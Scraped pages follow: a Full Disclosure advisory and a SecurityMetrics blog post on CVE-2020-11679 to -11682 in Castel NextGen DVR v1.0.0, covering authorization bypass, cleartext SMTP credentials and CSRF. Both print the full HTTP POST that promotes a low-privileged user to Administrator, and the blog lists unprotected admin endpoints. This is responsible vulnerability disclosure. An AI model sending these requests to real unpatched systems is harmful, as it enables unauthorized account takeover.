=== Content from seclists.org_4781466a_20250119_112052.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](7)
[By Date](date.html#8)
[![Next](/images/right-icon-16x16.png)](9)

[![Previous](/images/left-icon-16x16.png)](7)
[By Thread](index.html#8)
[![Next](/images/right-icon-16x16.png)](9)

![](/shared/images/nst-icons.svg#search)

# Castel NextGen DVR multiple CVEs

---

*From*: Aaron Bishop <aaron () securitymetrics com>

*Date*: Wed, 3 Jun 2020 16:48:28 -0600

---

```
All issues are associated with *Castel NextGen DVR v1.0.0 *and have been
resolved in v1.0.1*.*

-------------------------------
*CVE-2020-11679
<<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11679>>*

*Original Disclosure*
<https://www.securitymetrics.com/blog/attackers-known-unknown-authorization-bypass>

*Description*
A low privileged user can call functionality reserved for an Administrator
which promotes a low privileged account to the Administrator role:

POST /Administration/Users/Edit/:ID HTTP/1.1

```
> ```
> Host: $RHOST
> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
> Firefox/52.0
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
> Accept-Language: en-US,en;q=0.5
> Accept-Encoding: gzip, deflate
> Cookie: $REVIEWER_COOKIES
> DNT: 1
> Connection: close
> Upgrade-Insecure-Requests: 1
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 349
>
> ```

```

```
> ```
> UserId=:ID&Email=bypass%40test.com
> &FirstName=bypass&LastName=bypass&LDAPUser=false
>
> &Roles%5B0%5D.RoleId=1&Roles%5B0%5D.IsSelected=true&Roles%5B0%5D.IsSelected=false
>
> &Roles%5B1%5D.RoleId=3&Roles%5B1%5D.IsSelected=true&Roles%5B1%5D.IsSelected=false
>
> &Roles%5B2%5D.RoleId=5&Roles%5B2%5D.IsSelected=true&Roles%5B2%5D.IsSelected=false
> &Locked=false
>
> ```

```

-------------------------------
*CVE-2020-11680
<<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11680>>*

*Original Disclosure*
<https://www.securitymetrics.com/blog/attackers-known-unknown-authorization-bypass>

*Description*
The application does not perform an authorization check before
functionality is performed.  Low privileged users are prevented from
browsing to pages that perform Administrator functionality using GET,
however, functionality can be performed by directly crafting the associated
POST request.   This can be exploited to modify user accounts, modify the
application, etc.  Combined with the reported CSRF, CVE-2020-11682, any
user of the application can be used to grant Administrator access to a
malicious user.
-------------------------------
*CVE-2020-11681
<<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11681>>*

*Original Disclosure*
<https://www.securitymetrics.com/blog/attackers-known-unknown-authorization-bypass>

*Description*
Credentials are returned in cleartext in the source of the SMTP page.  If a
malicious user compromises an account. or exploits the CSRF to gain access
to the application,  the associated SMTP server/account could also be
compromised.
-------------------------------
*CVE-2020-11682
<<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11682>>*

*Original Disclosure*
<https://www.securitymetrics.com/blog/where-did-request-come-from-cross-site-request-forgery-csrf>

*Description*
The application does not properly prevent CSRF; the
__RequestVerificationToken, which is included with state changing requests,
is not verified by the application - requests are successful even when the
token is removed.

AARON BISHOP | Principal Penetration Tester CISSP, OSCP, OSWE [image:
SecurityMetrics]

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](7)
[By Date](date.html#8)
[![Next](/images/right-icon-16x16.png)](9)

[![Previous](/images/left-icon-16x16.png)](7)
[By Thread](index.html#8)
[![Next](/images/right-icon-16x16.png)](9)

### Current thread:

* **Castel NextGen DVR multiple CVEs** *Aaron Bishop (Jun 05)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from packetstormsecurity.com_eda34826_20250119_112051.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

Â [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from www.securitymetrics.com_f435cb7b_20250119_131428.html ===


[![SecurityMetrics](/content/dam/securitymetrics/Header/sm_logo.svg)](/)

[![SecurityMetrics](/content/dam/securitymetrics/Header/sm_logo.svg)](/)

* Products
  ## Products

  ###### Did you get notified about PCI compliance?

  [Get Started](https://www.securitymetrics.com/contact/lets-get-you-to-the-right-place)
  ##### Incident Response

  801.705.5621

  #### Compliance

  + [PCI Compliance](/pci "PCI Compliance")
    - [PCI for Small Business](/pci-small-business "PCI for Small Business")
    - [PCI Policies](/pci-policies "PCI Policies")
    - [PCI Training](/pci-training "PCI Training")
    - [Onsite PCI DSS Audit](/pci-audit "Onsite PCI DSS Audit")
  + [HIPAA Compliance](/hipaa "HIPAA Compliance")
    - [HIPAA for Small Business](/guided-hipaa "HIPAA for Small Business")
    - [HIPAA Policies](/hipaa-policies "HIPAA Policies")
    - [HIPAA Training](/hipaa-training "HIPAA Training")
  + [GDPR Compliance](/gdpr-defense "GDPR Compliance")
    - [GDPR Defense](/gdpr-defense "GDPR Defense")
  + [Managed Programs](/compliance-solutions "Managed Programs")
    - [Acquirer PCI Program](/pci-program "Acquirer PCI Program")
    - [Managed Acquirer PCI Program](/managed-pci-program "Managed Acquirer PCI Program")- [HIPAA for Health Networks](/health-network-program "HIPAA for Health Networks")

  #### Cybersecurity

  + [Scanning](/data-security "Scanning")
    - [External Vulnerability Scan (ASV)](/vulnerability-scan "External Vulnerability Scan (ASV)")
    - [Internal Vulnerability Scan](/internal-network-scan "Internal Vulnerability Scan")
    - [Mobile Security](/mobile "Mobile Security")
  + [Data Discovery](/data-security "Data Discovery")
    - [Card Data Discovery](/card-data-discovery "Card Data Discovery")
    - [PII Data Discovery](/pii-data-discovery "PII Data Discovery")
  + [Ecommerce Security](/webpage-integrity-monitoring "Ecommerce Security")
    - [Shopping Cart Inspect](/shopping-cart-inspect "Shopping Cart Inspect")
    - [Shopping Cart Monitor](/shopping-cart-monitor "Shopping Cart Monitor")

  ####

  + [Security Operations](/pulse "Security Operations")
    - [SecurityMetrics Pulse](/pulse "SecurityMetrics Pulse")
    - [Antivirus Essentials](/anti-virus-essentials "Antivirus Essentials")
  + [Workforce Training](/workforce-training "Workforce Training")
    - [Workforce Training](/workforce-training "Workforce Training")
    - [Cybersecurity Training](/security-training "Cybersecurity Training")
    - [PCI Training](/pci-training "PCI Training")
    - [HIPAA Training](/hipaa-training "HIPAA Training")

  ![](https://marvel-b1-cdn.bc0a.com/f00000000032040/www.securitymetrics.com/content/dam/securitymetrics/hero-images/banner-panscan.jpg)

  [### Ecommerce Security Testing Demo](https://www.securitymetrics.com/lp/education/webinar/shopping-cart-monitor-demo-2023)

  Find out how you can monitor your iframe, ecommerce, and payment pages for eskimming and protect customer payment card data.
* Assessments
  ## Assessments

  ###### Get Started with Compliance and Security

  [Request Quote](/compliance-solutions)
  ##### Incident Response

  801.705.5621

  #### Compliance

  + [PCI Compliance](/pci "PCI Compliance")
    - [PCI DSS Audit](/pci-audit "PCI DSS Audit")
    - [SSF (PA-DSS) Audit](/pa-dss-audit "SSF (PA-DSS) Audit")
    - [P2PE Audit](/p2pe-audit "P2PE Audit")
    - [PIN Security Audit](/pin-audit "PIN Security Audit")
    - [Acquirer PCI Program](/pci-program "Acquirer PCI Program")
    - [Managed Acquirer PCI Program](/managed-pci-program "Managed Acquirer PCI Program")
    - [Risk Assessment](/nist-800-30 "Risk Assessment")
  + [HIPAA Compliance](/hipaa "HIPAA Compliance")
    - [HIPAA Audit](/hipaa-audit "HIPAA Audit")- [HIPAA for Health Networks](/health-network-program "HIPAA for Health Networks")
      - [Risk Assessment](/nist-800-30 "Risk Assessment")
  + [GDPR Compliance](/gdpr-defense "GDPR Compliance")
    - [GDPR Defense](/gdpr-defense "GDPR Defense")
  + [HITRUST](/hitrust "HITRUST")
    - [HITRUST Assessment](/hitrust "HITRUST Assessment")

  #### Cybersecurity

  + [Security Testing](/data-security "Security Testing")
    - [Penetration Testing](/penetration-testing "Penetration Testing")
    - [External Vulnerability Scan (ASV)](/vulnerability-scan "External Vulnerability Scan (ASV)")
    - [Ecommerce Security](/webpage-integrity-monitoring "Ecommerce Security")
  + [Security Audits](/security-consulting "Security Audits")
    - [Security Consulting](/security-consulting "Security Consulting")
    - [NIST 800-30 Risk Assessment](/nist-800-30 "NIST 800-30 Risk Assessment")
    - [EI3PA Compliance](/ei3pa "EI3PA Compliance")
    - [CIS Controls Audit](/cis-controls-audit "CIS Controls Audit")
  + [Security Operations](/pulse "Security Operations")
    - [SecurityMetrics Pulse](/pulse "SecurityMetrics Pulse")

  ####

  + [Incident Response](/forensics "Incident Response")
    - [PFI/Cyber Forensic Investigation](/forensics "PFI/Cyber Forensic Investigation")

  ![](https://marvel-b1-cdn.bc0a.com/f00000000032040/www.securitymetrics.com/content/dam/securitymetrics/hero-images/HIPAA%202019%20data%20visualization%20graphic%201200%20x%20544%2072%20dpi%20B.jpg)

  [### Are You Ready for a PCI v4.0 Audit?](https://www.securitymetrics.com/lp/education/webinar/pci-audit-demo-2023)

  Find out how SecurityMetrics prepares its customers for a successful PCI 4.0 assessment.
* Partner
  ## Partner

  ###### Choose A PCI Program That's Invested In Your Success

  [Get In Touch](/pci-program)
  ##### Incident Response

  801.705.5621

  ####

  + [About SecurityMetrics](/about "About SecurityMetrics")
    - [SecurityMetrics secures peace of mind for organizations that handle sensitive data.](/about "SecurityMetrics secures peace of mind for organizations that handle sensitive data. ")
  + [Become a PCI Partner](/pci-program "Become a PCI Partner")
    - [Simplify PCI compliance for your merchants and increase revenue.](/pci-program "Simplify PCI compliance for your merchants and increase revenue.")

  ####

  + [Become a HIPAA Partner](/health-network-program "Become a HIPAA Partner")
    - [Safeguard patient health information and meet your compliance goals.](/health-network-program "Safeguard patient health information and meet your compliance goals.")
  + [Become a Reseller](/reseller "Become a Reseller")
    - [Give your customers the tools, education, and support they need to secure their network.](/reseller "Give your customers the tools, education, and support they need to secure their network.")

  ####

  + [Partner Login](https://www.securitymetrics.com/login "Partner Login")
    - [Access for our registered Partners page to help you be successful with SecurityMetrics.](https://www.securitymetrics.com/login "Access for our registered Partners page to help you be successful with SecurityMetrics. ")

  ![](https://marvel-b1-cdn.bc0a.com/f00000000032040/www.securitymetrics.com/content/dam/securitymetrics/PCI/pci-program/PCI-Program-Data-Sheet.png)

  [### PCI Program Data Sheet](https://www.securitymetrics.com/content/dam/securitymetrics/PDF-files/PCI_Program_Data_Sheet.pdf)

  SecurityMetrics PCI program guides your merchants through the PCI validation process, helping you increase merchant satisfaction and freeing up your time.
* Industries
  ## Industries

  ###### Get Started with Compliance and Security

  [Request Quote](/compliance-solutions)
  ##### Incident Response

  801.705.5621

  ####

  + [Service Provider](/service-providers-solutions "Service Provider")
    - [Choose a partner who understands service providersâ compliance and operations.](/service-providers-solutions "Choose a partner who understands service providersâ compliance and operations.")
  + [Higher Education](/higher-education-solutions "Higher Education")
    - [Protect sensitive data against threat actors who target higher education.](/higher-education-solutions "Protect sensitive data against threat actors who target higher education.")
  + [Retail](/retail-solutions "Retail")
    - [Prevent exposure to a cyber attack on your retail organization network.](/retail-solutions "Prevent exposure to a cyber attack on your retail organization network.")
  + [Hospitality](/hospitality-solutions "Hospitality")
    - [Combat threat actors and meet compliance goals with innovative solutions for hospitality.](/hospitality-solutions "Combat threat actors and meet compliance goals with innovative solutions for hospitality.")

  ####

  + [Financial Services](/financial-industry-solutions "Financial Services")
    - [Simplify PCI compliance for your merchants and increase revenue.](/financial-industry-solutions "Simplify PCI compliance for your merchants and increase revenue.")
  + [Healthcare](/healthcare-industry-solutions "Healthcare")
    - [Safeguard patient health information and meet your compliance goals.](/healthcare-industry-solutions "Safeguard patient health information and meet your compliance goals.")
  + [Franchise](/franchise-solutions "Franchise")
    - [Increase franchiseesâ compliance and minimize your breach exposure.](/franchise-solutions "Increase franchiseesâ compliance and minimize your breach exposure.")
  + [Government](/government-solutions "Government")
    - [Make your compliance and data security processes simple with government solutions.](/government-solutions "Make your compliance and data security processes simple with government solutions.")

  ####

  + [Compliance Solutions](/compliance-solutions "Compliance Solutions")
    - [Enjoy innovative solutions that fit your unique compliance needs.](/compliance-solutions "Enjoy innovative solutions that fit your unique compliance needs.")
  + [Cybersecurity Solutions](/data-security "Cybersecurity Solutions")
    - [Secure your valuable sensitive data with cutting-edge cybersecurity solutions.](/data-security "Secure your valuable sensitive data with cutting-edge cybersecurity solutions.")
  + [Reseller Solutions](/reseller "Reseller Solutions")
    - [Give your customers the tools, education, and support they need to secure their network.](/reseller "Give your customers the tools, education, and support they need to secure their network.")

  ![](https://marvel-b1-cdn.bc0a.com/f00000000032040/www.securitymetrics.com/content/dam/securitymetrics/hero-images/Academy%20BW%20website%20image.jpg)

  [### Guide to PCI DSS Compliance](https://www.securitymetrics.com/lp/pci/pci-guide)

  Cybercriminals know how to steal your customerâs payment information. Do you know how to secure it?
* Learn
  ## Learn

  ###### Get Started with Compliance and Security

  [Request Quote](/compliance-solutions)
  ##### Incident Response

  801.705.5621

  ####

  + [About SecurityMetrics](/about "About SecurityMetrics")
    - [SecurityMetrics secures peace of mind for organizations that handle sensitive data.](/about "SecurityMetrics secures peace of mind for organizations that handle sensitive data. ")
  + [Blog](https://www.securitymetrics.com/blog/ "Blog")
    - [Our Blog covers best practices for keeping your organizationâs data secure.](https://www.securitymetrics.com/blog/ "Our Blog covers best practices for keeping your organizationâs data secure.")
  + [Learning Center](https://www.securitymetrics.com/learn/ "Learning Center")
    - [Our Learning Center discusses the latest in security and compliance news and updates.](https://www.securitymetrics.com/learn/ "Our Learning Center discusses the latest in security and compliance news and updates.")

  ####

  + [Academy](https://academy.securitymetrics.com/ "Academy")
    - [Our Academy can help SMBs address specific cybersecurity risks businesses may face.](https://academy.securitymetrics.com/ "Our Academy can help SMBs address specific cybersecurity risks businesses may face.")
  + [Summit](https://www.securitymetrics.com/summit "Summit")
    - [Watch SecurityMetrics Summit and learn how to improve your data security and compliance.](https://www.securitymetrics.com/summit "Watch SecurityMetrics Summit and learn how to improve your data security and compliance.")
  + [Events](/events "Events")
    - [Want to connect in person? Find out where SecurityMetrics will be next.](/events "Want to connect in person? Find out where SecurityMetrics will be next.")

  ####

  + [Podcast](https://www.securitymetrics.com/learn/podcast "Podcast")
    - [Our podcast helps you better understand current data security and compliance trends.](https://www.securitymetrics.com/learn/podcast "Our podcast helps you better understand current data security and compliance trends.")
  + [News](https://www.securitymetrics.com/lp/education/threat-intelligence-subscribe "News")
    - [SecurityMetrics analysts monitor current cybercriminal trends to give you threat insights.](https://www.securitymetrics.com/lp/education/threat-intelligence-subscribe "SecurityMetrics analysts monitor current cybercriminal trends to give you threat insights.")

  ![](https://marvel-b1-cdn.bc0a.com/f00000000032040/www.securitymetrics.com/content/dam/securitymetrics/hero-images/PCI%202019%20data%20visualization%20graphic%201200%20x%20544%2072%20dpi.jpg)

  [### Guide to PCI DSS Compliance](https://www.securitymetrics.com/lp/pci/pci-guide)

  Cybercriminals know how to steal your customerâs payment information. Do you know how to secure it?

* + ![](https://marvel-b1-cdn.bc0a.com/f00000000032040/www.securitymetrics.com/content/dam/securitymetrics/menu-flags/us-country.png)801.995.6855
  + ![](https://marvel-b1-cdn.bc0a.com/f00000000032040/www.securitymetrics.com/content/dam/securitymetrics/menu-flags/can-country.png)801.995.6855
  + ![](https://marvel-b1-cdn.bc0a.com/f00000000032040/www.securitymetrics.com/content/dam/securitymetrics/menu-flags/uk-country.png)0203.890.5505![](https://marvel-b1-cdn.bc0a.com/f00000000032040/www.securitymetrics.com/content/dam/securitymetrics/menu-flags/us-country.png)801.995.6855
* ![](/etc.clientlibs/securitymetrics/clientlibs/clientlib-base/resources/images/search_white.svg)
* [Contact](/contact)
* [Login](/login)

[BLOG HOME](/blog/) >
[Cybersecurity](https://www.securitymetrics.com/blog/cybersecurity) >
Authorization Bypass: CVE (2020-11679, 2020-11680, 2020-11681)

# Authorization Bypass: CVE (2020-11679, 2020-11680, 2020-11681)

Author: Aaron Bishop

---

## authorization bypass

## Attackers: Known or Unknown? That is the Question

Far too often I come across applications where developers have made every attempt to secure their application from the "unknown attacker." Ah, the ever-elusive Hollywood-esque hacker; just a lone wolf in a dark room, the blue glow of their dozen monitors illuminating the Guy Fawkes mask that conceals their face. In reality, however, most applications have the vast majority of their functionality (and potential attack surface) behind the login page where the "known" users roam. What if the feared "unknown attacker" turns out to be a trusted, authenticated, "known" user? Maybe the "unknown attacker" registered for the application or compromised a valid account and now has access. Is the sensitive functionality properly restricted from these "known" users as well?

For example, can low-privileged users browse directly to functionality that should be reserved for higher-privileged roles? Hiding elements with `CSS` or `HTML` comments or not including links in the navbar may be convenient for normal users but it does not provide security or proper access control which opens the door for abuse and attacks. Similarly, restricting `GET` requests can prevent users from viewing restricted information, but what about other HTTP methods? Are low-privileged users able to `POST` a form or `PUT` JSON thus allowing them to create objects or modify the state of the application?

So our story begins... during a [penetration test](http://www.securitymetrics.com/blog/how-much-does-pentest-cost), a valid, low-privileged user was able to perform actions that should have been restricted - including promoting their own account to admin.

## Authorization Bypass in a Penetration Test

I had access to two accounts: a low-privileged *Reviewer* and a high-privileged *Administrator*. The *Reviewer* had restricted access and could not browse to the functionality in the **Administration** tab that was visible from the *Administrator* role:

![](https://ix-cdn.b2e5.com/images/32040/32040_12df37619f9d48aa9ac6eaff7c78ca12_1590675968.jpeg)

![authorization bypass](https://ix-cdn.b2e5.com/images/32040/32040_fb36b78c7fc846d49791db247f9c1857_1590675929.jpeg)

Browsing directly to the page is the simplest way to check if access controls exist but isn't the only option. For instance, I wondered how the application would respond if I called *Administrator* functionality that used another method, like the following *POST* request to modify my user roles:

```

POST /Administration/Users/Edit/:ID HTTP/1.1
Host: $RHOST
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: $REVIEWER_COOKIES
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 349

UserId=:ID&Email=bypass%40test.com&FirstName=bypass&LastName=bypass&LDAPUser=false
&Roles%5B0%5D.RoleId=1&Roles%5B0%5D.IsSelected=true&Roles%5B0%5D.IsSelected=false
&Roles%5B1%5D.RoleId=3&Roles%5B1%5D.IsSelected=true&Roles%5B1%5D.IsSelected=false
&Roles%5B2%5D.RoleId=5&Roles%5B2%5D.IsSelected=true&Roles%5B2%5D.IsSelected=false
&Locked=false

```

Well ... the application responded with the following error:

![error message](https://ix-cdn.b2e5.com/images/32040/32040_df95e95254d24ebab1a74dce2a9bb61e_1590676012.png)

But the error was not a denial of access or due to insufficient privileges; it was a general error that had not appeared in the application before.

In the past I've come across applications that set permissions and access levels when a user authenticates, so I logged out, then logged back in and the Administrative functionality was now accessible.

As my low-privileged user I could directly call functionality provided by **/Administration/Users** to add the *Administrator* role to my account or I could create a new user with the *Administrator* role. (This issue was reported, resolved, and assigned [CVE-2020-11679](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11679).)

I then used my escalated privileges to view pages that were previously restricted, pages such as **/Administration/SMTP**. I reviewed the source for **/Administration/SMTP** and noticed the credentials for the server were in the page:

![administrator](https://ix-cdn.b2e5.com/images/32040/32040_4c65c615acd84267b80a6d251cbb8899_1590686566.png)

Returning authentication credentials in the source of the application is a dangerous practice; if the page is cached or a malicious user is able to bypass restrictions (like I did), the credentials would be disclosed and the account compromised. In this instance, the SMTP account could be abused to spoof messages, spam others, etc.. (This issue was reported, resolved, and assigned [CVE-2020-11681](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11681))

I removed the *Administrator* role from my account so it was, once again, low privilege and evaluated additional calls. I found that I could directly call the functionality of the following **/Administration** pages:

```

POST /Administration/Alerts/Create Â  Â  Â  Â  Â POST /Administration/Alerts/Delete
POST /Administration/Archiving/ Â  Â  Â  Â  Â  Â  POST /Administration/Archiving/Create
POST /Administration/Archiving/Delete Â  Â  Â  POST /Administration/FileStores/Create
POST /Administration/FileStores/Delete Â  Â  Â POST /Administration/LDAP
POST /Administration/Roles/Create Â  Â  Â  Â  Â  POST /Administration/Roles/Edit/:RoleId
POST /Administration/Roles/Delete Â  Â  Â  Â  Â  POST /Administration/SMTP
POST /Administration/Users/Create Â  Â  Â  Â  Â  POST /Administration/Users/Edit/:UserId

POST /Administration/Users/ResetPassword
POST /Administration/FileStores/Edit/:FileStoreId
POST /Administration/Archiving/Edit/:ArchiveRuleId
POST /Administration/Alerts/Edit/:EventAlertId
```

I used the calls to modify the information in other accounts (like the account email), then forced password resets, and finally compromised the accounts.

Low-privileged users could directly call functionality intended only for users with the *Administrator* role; the ability to bypass authorization was reported, resolved, and assigned [CVE-2020-11680](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11680).

## Conclusion

My user was "trusted", but my actions should not have been. I was able to directly call functionality that should have been restricted; I promoted my own role to *Administrator* and retrieved credentials for another host. If an "unknown attacker" in a Guy Fawkes mask compromised a user account they could have, from there, moved on to admin and the extent of damage caused could have been catastrophic.

Review [OWASP Proactive Controls](https://owasp.org/www-project-proactive-controls/v3/en/c7-enforce-access-controls.html), Be proactive. Protect your application, even if it is from your own "known" and "trusted" users.

![pci logo](https://marvel-b1-cdn.bc0a.com/f00000000032040/www.securitymetrics.com/content/experience-fragments/securitymetrics/en/footer/master/_jcr_content/root/responsivegrid/footer/imagePar1/image.coreimg.100.300.png/1582735036858/asv-logo.png)

[![SecurityMetrics, Inc. BBB Business Review](https://marvel-b1-cdn.bc0a.com/f00000000032040/seal-utah.bbb.org/logo/ruhzbum/bbb-22008052.png)](https://www.bbb.org/us/ut/orem/profile/credit-card-protection-services/securitymetrics-inc-1166-22008052/#sealclick)

### COMPLIANCE

* [GDPR Compliance](/gdpr-defense "GDPR Compliance")
* [PCI Compliance](/pci "PCI Compliance")
* [PCI DSS Audit](/pci-audit "PCI DSS Audit")
* [PCI Level 4 Program](/pci-program "PCI Level 4 Program")
* [Managed PCI Level 4 Program](/managed-pci-program "Managed PCI Level 4 Program")
* [PA-DSS/SSF Audit](/pa-dss-audit "PA-DSS/SSF Audit")
* [P2PE Audit](/p2pe-audit "P2PE Audit")
* [PIN Security Assessment](/pin-audit "PIN Security Assessment")
* [PCI Policies](/pci-policies "PCI Policies")
* [PCI Training](/pci-training "PCI Training")
* [HIPAA Compliance](/hipaa "HIPAA Compliance")
* [HIPAA Policies](/hipaa-policies "HIPAA Policies")
* [HIPAA Training](/hipaa-training "HIPAA Training")
* [HIPAA BA Program](/hipaa-audit "HIPAA BA Program")
* [HITRUST](/hitrust "HITRUST")

### DATA SECURITY

* [Vulnerability Scan](/vulnerability-scan "Vulnerability Scan")
* [Penetration Testing](/penetration-testing "Penetration Testing")
* [Security Training](/security-training "Security Training")
* [PANscanÂ®](/card-data-discovery " PANscanÂ®")
* [SecurityMetrics Vision](/internal-network-scan "SecurityMetrics Vision")
* [SecurityMetrics Mobile](/mobile "SecurityMetrics Mobile")
* [CIS Controls Assessment](/cis-controls-audit "CIS Controls Assessment")
* [Consulting](/security-consulting "Consulting")
* [Reseller](/reseller "Reseller")
* [Forensic/Incident Response](/forensics "Forensic/Incident Response")
* [Data and Network Security](/data-security "Data and Network Security")
* [Data Security Academy](https://academy.securitymetrics.com "Data Security Academy")
* [Webpage Integrity Monitoring (WIM)](/webpage-integrity-monitoring "Webpage Integrity Monitoring (WIM)")
* [Shopping Cart Inspect](/shopping-cart-inspect "Shopping Cart Inspect")
* [Shopping Cart Monitor](/shopping-cart-monitor "Shopping Cart Monitor")
* [SecurityMetrics Pulse](/pulse "SecurityMetrics Pulse")

### COMPANY

* [Our Story](/about "Our Story")
* [Blog](https://www.securitymetrics.com/blog/ "Blog")
* [Glossary](/glossary "Glossary")
* [Media Relations](/news "Media Relations")
* [Careers](/careers "Careers")
* [Terms of Use](/terms-of-service "Terms of Use")
* [Privacy](/terms-of-service#privacy "Privacy")
* Manage Cookies
* [Privacy Rights Requests](/gdpr-rights-request "Privacy Rights Requests")
* [Abuse](/terms-of-service#abuse "Abuse")
* [Do Not Sell My Information](/terms-of-service#do-not-sell-my-information "Do Not Sell My Information")

## Contact

* [Contact Us](/contact "Contact Us")
* [Contact Sales](/contact/contact-sales "Contact Sales")
* [Contact Support](/contact/contact-support "Contact Support")
* Report a Vulnerability

### STAY UP TO DATE

STAY UP TO DATE

SUBSCRIBE TO OUR BLOG

[Subscribe](https://info.securitymetrics.com/subscribe)

Your IP Address is: 20.204.220.203

Â©
 SecurityMetrics Inc., All Rights Reserved.

![](https://googleads.g.doubleclick.net/pagead/viewthroughconversion/1072670678/?value=0&label=Xpj1CNrCugQQ1s--_wM&guid=ON&script=0)


